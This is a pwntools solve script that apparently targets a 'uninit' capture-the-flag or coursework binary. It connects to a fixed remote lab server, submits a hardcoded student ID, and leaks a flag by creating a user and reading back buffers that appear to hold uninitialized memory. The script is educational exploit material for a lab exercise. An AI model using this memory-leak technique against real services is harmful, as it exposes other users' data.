from pwn import *

context.log_level = 'DEBUG'
context.binary = elf = ELF('./uninit')

REMOTE = 1
if REMOTE:
    p = remote('8.154.20.109', 10400)
    p.recvuntil(b"Please input your StudentID:\n")
    p.sendline(b"3220103784")
else:
    p = process('./uninit')

def AddUser(name, password, intro, motto):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"name > ", name)
    p.sendlineafter(b"password > ", password)
    p.sendlineafter(b"introduction > ", intro)
    p.sendlineafter(b"motto > ", motto)
    p.recvuntil(b"at index ")
    return int(p.recvline().strip())

def ShowUser(index, password):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"index > ", str(index).encode())
    p.sendlineafter(b"password > ", password)
    p.recvuntil(b"user name: ")
    name = p.recv(0x20)
    p.recvuntil(b"user motto: ")
    motto = p.recv(0x20)
    p.recvuntil(b"user intro: ")
    intro = p.recv(0x40)
    return name, motto, intro

idx = AddUser(b"Anya1"*4, b"Reese"*4, b"A"*0x10, b"555555"*3)

name, motto, flag = ShowUser(idx, b"Reese"*4)

print("Flag content:", flag)

p.interactive()